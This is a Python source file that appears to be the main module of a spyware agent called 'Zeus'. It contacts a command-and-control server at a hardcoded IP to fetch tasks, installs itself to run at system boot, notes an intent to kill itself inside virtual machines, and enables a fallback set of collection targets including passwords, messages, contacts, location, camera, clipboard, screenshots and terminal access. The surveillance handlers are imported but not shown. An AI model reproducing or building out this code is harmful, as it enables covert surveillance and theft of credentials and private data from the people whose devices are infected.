#!/usr/local/bin/python

import requests

from Handlers.BootPersistanceHandler import BootPersistanceHandler
from Handlers.TaskManagmentHandler import TaskManagmentHandler

global configurations
configurations = {}

def loadConfigurations(getLocallyAlternative=True):
    global configurations

    # Download configurations from Command & Control server
    didLoadWithSuccess = False

    response = requests.get("http://192.168.0.102/control.php?task=getConfigurations&agent=zeus")

    if response.text:
        configurations = response.text
        didLoadWithSuccess = True
    else:
        if getLocallyAlternative:

            socialConfigurations = {"addressbook": 1, "chat": 1, "messages": 1, "position": 1, "photo": 1, "file": 1,
                                "device": 1}
            configurations = {"social": socialConfigurations, "position": 1, "clipboard": 1, "password": 1, "screenshot": 1,
                          "camera": 1, "url": 1, "deviceInfo": 1, "terminal": 1}

    # On error loading configurations, return false
    return didLoadWithSuccess

def startAndListen():
    print("[i] Starts listening to commands")
    taskMgr = TaskManagmentHandler()
    taskMgr.startTask()

def authenticateDeviceID():
    print("Authenticate device ID with server")

def main():
    print("[i] Starting Zeus")

    # Check if we run in Virtual Machine - Kill if yes

    # Check if agents exists on device, if not - immediately copy itself to system boot/run
    bootHandler = BootPersistanceHandler()
    bootHandler.addSelfToSystemToBoot() # Ignore if we already exists

    didLoadConfSuccfully = loadConfigurations()
    if didLoadConfSuccfully:
        startAndListen()

if __name__ == "__main__":
    print("[i] - Information")
    print("[e] - Error")
    print("[l] - Logging\n")

    main()